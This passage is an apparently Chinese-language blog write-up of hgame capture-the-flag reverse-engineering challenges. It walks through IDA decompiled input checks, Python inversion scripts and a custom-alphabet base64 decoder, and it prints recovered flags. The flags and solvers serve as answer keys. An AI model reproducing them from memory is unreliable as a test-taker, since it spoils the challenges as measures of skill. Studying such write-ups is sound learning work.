a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(<span class="number">2</span> * i + a2) &lt;= <span class="number">96</span> || *(_BYTE *)(<span class="number">2</span> * i + a2) &gt; <span class="number">102</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(<span class="number">2</span> * i + a2) &lt;= <span class="number">47</span> || *(_BYTE *)(<span class="number">2</span> * i + a2) &gt; <span class="number">57</span> )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_17:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Illegal input!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      *(_BYTE *)(i + a1) = *(_BYTE *)(<span class="number">2</span> * i + a2) - <span class="number">48</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)(i + a1) = *(_BYTE *)(<span class="number">2</span> * i + a2) - <span class="number">87</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(<span class="number">2</span> * i + <span class="number">1LL</span> + a2) &lt;= <span class="number">96</span> || *(_BYTE *)(<span class="number">2</span> * i + <span class="number">1LL</span> + a2) &gt; <span class="number">102</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(<span class="number">2</span> * i + <span class="number">1LL</span> + a2) &lt;= <span class="number">47</span> || *(_BYTE *)(<span class="number">2</span> * i + <span class="number">1LL</span> + a2) &gt; <span class="number">57</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      result = (_BYTE *)(i + a1);</span><br><span class="line">      *result = <span class="number">16</span> * *result + *(_BYTE *)(<span class="number">2</span> * i + <span class="number">1LL</span> + a2) - <span class="number">48</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = (_BYTE *)(i + a1);</span><br><span class="line">      *result = <span class="number">16</span> * *result + *(_BYTE *)(<span class="number">2</span> * i + <span class="number">1LL</span> + a2) - <span class="number">87</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//sub_400616()这里的处理逻辑有些混乱，实际上就是只能输入0-9，a-f之间的字符，然后对数字和字母会进行不同的处理</span></span><br></pre></td></tr></table></figure>

<p>把整个过程理解清楚之后可以开始写脚本进行一个逆运算了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># 第三部分逆运算</span></span><br><span class="line">v = [<span class="number">76</span>, <span class="number">60</span>, <span class="number">214</span>, <span class="number">54</span>, <span class="number">80</span>, <span class="number">136</span>, <span class="number">32</span>, <span class="number">204</span>]</span><br><span class="line">v0 = <span class="string">&#x27;e4sy_Re_&#x27;</span></span><br><span class="line">v14 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v0)):</span><br><span class="line">    v14.append(<span class="built_in">ord</span>(v0[i]) ^ v[i])</span><br><span class="line"><span class="comment"># print(v14)</span></span><br><span class="line"></span><br><span class="line">v16 = []</span><br><span class="line">v1 = <span class="string">&#x27;Easylif3&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v1)):</span><br><span class="line">    v16.append(<span class="built_in">ord</span>(v1[i]) ^ v14[i])  <span class="comment"># v14经过两次和v的异或又变回了原本的值</span></span><br><span class="line"><span class="comment"># print(v16)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二部分逆运算</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="comment"># print(bin(v14[i])[2:].rjust(8,&#x27;0&#x27;))</span></span><br><span class="line">    v14[i] = (((v14[i] &amp; <span class="number">0x55</span>) ^ ((v16[<span class="number">7</span> - i] &amp; <span class="number">0xAA</span>) &gt;&gt; <span class="number">1</span>) % <span class="number">256</span>) | v14[i] &amp; <span class="number">0xAA</span>) % <span class="number">256</span></span><br><span class="line">    <span class="comment"># print(bin(v14[i])[2:].rjust(8,&#x27;0&#x27;))</span></span><br><span class="line">    <span class="comment"># print(bin(v16[7-i])[2:].rjust(8, &#x27;0&#x27;))</span></span><br><span class="line">    v16[<span class="number">7</span> - i] = (<span class="number">2</span> * (v14[i] &amp; <span class="number">0x55</span>) ^ v16[<span class="number">7</span> - i] &amp; <span class="number">0xAA</span> | v16[<span class="number">7</span> - i] &amp; <span class="number">0x55</span>) % <span class="number">256</span></span><br><span class="line">    <span class="comment"># print(bin(v16[7-i])[2:].rjust(8, &#x27;0&#x27;))</span></span><br><span class="line">    <span class="comment"># print(bin(v14[i])[2:].rjust(8, &#x27;0&#x27;))</span></span><br><span class="line">    v14[i] = (((v14[i] &amp; <span class="number">0x55</span>) ^ ((v16[<span class="number">7</span> - i] &amp; <span class="number">0xAA</span>) &gt;&gt; <span class="number">1</span>) % <span class="number">256</span>) | v14[i] &amp; <span class="number">0xAA</span>) % <span class="number">256</span></span><br><span class="line">    <span class="comment"># print(bin(v14[i])[2:].rjust(8, &#x27;0&#x27;))</span></span><br><span class="line">    <span class="comment"># print(bin(v14[i])[2:].rjust(8,&#x27;0&#x27;))</span></span><br><span class="line">    v14[i] = (((v14[i] &amp; <span class="number">0x1F</span>) &lt;&lt; <span class="number">5</span>) | ((v14[i] &amp; <span class="number">0xF8</span>) &gt;&gt; <span class="number">3</span>)) % <span class="number">256</span></span><br><span class="line">    <span class="comment"># print(bin(v14[i])[2:].rjust(8,&#x27;0&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(v14)</span></span><br><span class="line"><span class="comment"># print(v16)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一部分逆运算</span></span><br><span class="line">v24 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">v25 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">alphabet = [<span class="number">48</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">57</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">99</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">102</span>]</span><br><span class="line"><span class="comment"># 字母表不多，逆运算难以进行所以采用遍历的方式进行计算</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> alphabet:</span><br><span class="line">        <span class="keyword">if</span> <span class="number">57</span> &gt;= j &gt; <span class="number">47</span>:</span><br><span class="line">            tmp = j - <span class="number">48</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp = j - <span class="number">87</span></span><br><span class="line">        v24[<span class="number">2</span>*i]=j</span><br><span class="line">        <span class="keyword">if</span> <span class="number">57</span> &gt;= v14[i] - <span class="number">16</span> * tmp + <span class="number">48</span> &gt; <span class="number">47</span>:</span><br><span class="line">            v24[<span class="number">2</span> * i + <span class="number">1</span>] = v14[i] - <span class="number">16</span> * tmp + <span class="number">48</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="number">102</span> &gt;= v14[i] - <span class="number">16</span> * tmp + <span class="number">87</span> &gt; <span class="number">96</span>:</span><br><span class="line">            v24[<span class="number">2</span> * i + <span class="number">1</span>] = v14[i] - <span class="number">16</span> * tmp + <span class="number">87</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> alphabet:</span><br><span class="line">        v25[<span class="number">2</span> * i] = j</span><br><span class="line">        <span class="keyword">if</span> <span class="number">57</span> &gt;= j &gt; <span class="number">47</span>:</span><br><span class="line">            tmp = j - <span class="number">48</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp = j - <span class="number">87</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">102</span> &gt;= v16[i] - <span class="number">16</span> * tmp + <span class="number">87</span> &gt; <span class="number">96</span>:</span><br><span class="line">            v25[<span class="number">2</span> * i + <span class="number">1</span>] = v16[i] - <span class="number">16</span> * tmp + <span class="number">87</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="number">57</span> &gt;= v16[i] - <span class="number">16</span> * tmp + <span class="number">48</span> &gt; <span class="number">47</span>:</span><br><span class="line">            v25[<span class="number">2</span> * i + <span class="number">1</span>] = v16[i] - <span class="number">16</span> * tmp + <span class="number">48</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(v24)</span></span><br><span class="line"><span class="comment"># print(v25)</span></span><br><span class="line">flag = <span class="string">&#x27;hgame&#123;&#x27;</span>+<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(v24[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]) + <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(v25[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)])+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>输出得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;0f233e63637982d266cbf41ecb1b0102&#125;</span><br></pre></td></tr></table></figure>

<p>到虚拟机上验证一下，发现结果正确</p>
<p><img src="https://s2.ax1x.com/2020/02/13/1qpqi9.png" alt="bitwise_operation2"></p>
<h4 id="advance"><a href="#advance" class="headerlink" title="advance"></a>advance</h4><p>windows可执行程序，打开发现还是让输入flag，然后验证正确与否，还是IDA反编译，发现所有的函数名字IDA都识别不了，根据程序打开的提示语，搜索所有字符串找到主函数入口，根据具体操作给部分函数和变量重新命名，大概了解其用途</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 len; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> len0; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v7; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">char</span> flag; <span class="comment">// [rsp+20h] [rbp-118h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input you flag:\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;flag, <span class="number">0</span>, <span class="number">0x100</span>ui64);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;flag, <span class="number">100</span>i64);</span><br><span class="line">  len = <span class="built_in">strlen</span>(&amp;flag);                          <span class="comment">// 如果输入的字符串少于256个字符，则返回字符串长度，否则返回256（0x100）</span></span><br><span class="line">  len0 = len;</span><br><span class="line">  <span class="keyword">if</span> ( !len )                                   <span class="comment">// 若输入空字符串，直接报错</span></span><br><span class="line">  &#123;</span><br><span class="line">LABEL_6:</span><br><span class="line">    v7 = <span class="string">&quot;try again\n&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = <span class="built_in">sub_140002000</span>(len);                      </span><br><span class="line">  v6 = <span class="built_in">malloc</span>(v5);								<span class="comment">// 分配空间</span></span><br><span class="line">  <span class="built_in">cryption</span>(v6, (__int64)&amp;flag, len0);           <span class="comment">// 加密算法部分</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(v6, <span class="string">&quot;0g371wvVy9qPztz7xQ+PxNuKxQv74B/5n/zwuPfX&quot;</span>, <span class="number">0x64</span>ui64) )<span class="comment">// 相同则返回0，跳过if，输出get it，flag正确</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">      <span class="built_in">free</span>(v6);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = <span class="string">&quot;get it\n&quot;</span>;</span><br><span class="line">LABEL_7:</span><br><span class="line">  <span class="built_in">puts</span>(v7);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//最重要的cryption加密函数</span></span><br><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">sub_140001EB0</span><span class="params">(_BYTE *a1, __int64 a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// er10</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rbx</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// rdi</span></span><br><span class="line">  _BYTE *v7; <span class="comment">// r9</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v8; <span class="comment">// r11</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// cl</span></span><br><span class="line">  <span class="comment">// a1是加密后输出内容的首地址，a2是输入的flag的首地址，a3是flag长度</span></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = a3 - <span class="number">2</span>;</span><br><span class="line">  v5 = a2;</span><br><span class="line">  v6 = a1;</span><br><span class="line">  v7 = a1;</span><br><span class="line">  <span class="keyword">if</span> ( v4 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = a2 + <span class="number">1</span>;</span><br><span class="line">    v9 = ((<span class="keyword">unsigned</span> __int64)((<span class="keyword">unsigned</span> __int64)(v4 - <span class="number">1</span>) * (<span class="keyword">unsigned</span> __int128)<span class="number">0xAAAAAAAAAAAAAAAB</span>ui64 &gt;&gt; <span class="number">64</span>) &gt;&gt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">    v3 = <span class="number">3</span> * v9;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v10 = *(<span class="keyword">unsigned</span> __int8 *)(v8 - <span class="number">1</span>);</span><br><span class="line">      v8 += <span class="number">3</span>i64;</span><br><span class="line">      *v7 = alphabet[v10 &gt;&gt; <span class="number">2</span>];</span><br><span class="line">      v7[<span class="number">1</span>] = alphabet[((<span class="keyword">unsigned</span> __int64)*(<span class="keyword">unsigned</span> __int8 *)(v8 - <span class="number">3</span>) &gt;&gt; <span class="number">4</span>) | <span class="number">16</span>i64 * (*(_BYTE *)(v8 - <span class="number">4</span>) &amp; <span class="number">3</span>)];</span><br><span class="line">      v7[<span class="number">2</span>] = alphabet[<span class="number">4</span>i64 * (*(_BYTE *)(v8 - <span class="number">3</span>) &amp; <span class="number">0xF</span>) | ((<span class="keyword">unsigned</span> __int64)*(<span class="keyword">unsigned</span> __int8 *)(v8 - <span class="number">2</span>) &gt;&gt; <span class="number">6</span>)];</span><br><span class="line">      v7[<span class="number">3</span>] = alphabet[*(_BYTE *)(v8 - <span class="number">2</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">      v7 += <span class="number">4</span>;</span><br><span class="line">      --v9;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v9 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    *v7 = alphabet[(<span class="keyword">unsigned</span> __int64)*(<span class="keyword">unsigned</span> __int8 *)(v3 + v5) &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v3 == a3 - <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = <span class="number">61</span>;</span><br><span class="line">      v7[<span class="number">1</span>] = alphabet[<span class="number">16</span> * (*(_BYTE *)(v3 + v5) &amp; <span class="number">3</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7[<span class="number">1</span>] = alphabet[((<span class="keyword">unsigned</span> __int64)*(<span class="keyword">unsigned</span> __int8 *)(v5 + v3 + <span class="number">1</span>) &gt;&gt; <span class="number">4</span>) | <span class="number">16</span>i64 * (*(_BYTE *)(v3 + v5) &amp; <span class="number">3</span>)];</span><br><span class="line">      v11 = alphabet[<span class="number">4</span> * (*(_BYTE *)(v5 + v3 + <span class="number">1</span>) &amp; <span class="number">0xF</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    v7[<span class="number">2</span>] = v11;</span><br><span class="line">    v7[<span class="number">3</span>] = <span class="number">61</span>;</span><br><span class="line">    v7 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v7 - v6 + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里进行了很多操作，逆向起来很复杂而且工作量和难度都很多大，于是寻求别的方法，发现所有的操作都是围绕alphabet这一个字符数组来的，所以找到这个数组</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alphabet=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br></pre></td></tr></table></figure>

<p>观察发现这个数组非常熟悉，和base64的字母表完全一样，只是字符调换了顺序，然后观察最后的目标字符串，猜想这可能是改变字母表之后的base64编码，所以将之前的base64解码程序字母表修改为本题所提供的字母表，运行程序获得flag，所以猜想是正确的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b64de</span>(<span class="params">path_in, path_out</span>):</span></span><br><span class="line">    b64_str = <span class="built_in">open</span>(path_in).read()</span><br><span class="line">    charset = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">    <span class="comment"># print(charset)</span></span><br><span class="line">    bin_str = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> b64_str:</span><br><span class="line">        <span class="keyword">if</span> i != <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                x = <span class="built_in">str</span>(<span class="built_in">bin</span>(charset.index(i))).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> ValueError:</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">            bin_str.append(<span class="string">&#x27;&#123;:0&gt;6&#125;&#x27;</span>.<span class="built_in">format</span>(x))  <span class="comment"># 填充成6位</span></span><br><span class="line">            <span class="comment"># print(bin_str)</span></span><br><span class="line">    b64_bin = <span class="built_in">bytearray</span>()  <span class="comment"># 最后只能写入bytes</span></span><br><span class="line">    nums = <span class="built_in">len</span>(bin_str) // <span class="number">4</span></span><br><span class="line">    remain = <span class="built_in">len</span>(bin_str) % <span class="number">4</span></span><br><span class="line">    fore_part = bin_str[:<span class="number">4</span> * nums]  <span class="comment"># 四个一组截取</span></span><br><span class="line">    <span class="comment"># print(fore_part)</span></span><br><span class="line">    <span class="keyword">while</span> fore_part:</span><br><span class="line">        <span class="comment"># 取4个6位base64字符，作为3个字节</span></span><br><span class="line">        b64_tmp = <span class="string">&#x27;&#x27;</span>.join(fore_part[:<span class="number">4</span>])  <span class="comment"># 4*6/8</span></span><br><span class="line"></span><br><span class="line">        b64_tmp = [<span class="built_in">int</span>(b64_tmp[x: x + <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">8</span>, <span class="number">16</span>]]  <span class="comment"># 转换成10进制</span></span><br><span class="line">        <span class="comment"># print(b64_tmp)</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> b64_tmp:</span><br><span class="line">            b64_bin.append(i)</span><br><span class="line">        fore_part = fore_part[<span class="number">4</span>:]  <span class="comment"># 向后移动四位</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> remain:</span><br><span class="line">        remain_part = <span class="string">&#x27;&#x27;</span>.join(bin_str[nums * <span class="number">4</span>:])</span><br><span class="line">        <span class="comment"># print(remain_part)</span></span><br><span class="line">        tmp = [<span class="built_in">int</span>(remain_part[i * <span class="number">8</span>:(i + <span class="number">1</span>) * <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(remain - <span class="number">1</span>)]</span><br><span class="line">        <span class="comment"># print(tmp)</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">            b64_bin.append(i)</span><br><span class="line">    <span class="comment"># print(b64_bin)</span></span><br><span class="line">    fd = <span class="built_in">open</span>(path_out, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    fd.write(b64_bin)</span><br><span class="line">    fd.close()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    b64de(<span class="string">&quot;./pic_en.txt&quot;</span>, <span class="string">&quot;./pic_de.txt&quot;</span>)</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>输出的flag为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;b45e6a_i5_50_eazy_6VVSQ&#125;</span><br></pre></td></tr></table></figure>

<h4 id="cpp"><a href="#cpp" class="headerlink" title="cpp"></a>cpp</h4><p>这题函数实在是太多，而且应该是万恶的出题人故意把函数标识去掉了，理解起来简直窒息，但是逆向这个东西，七分理解三分猜，于是开猜</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 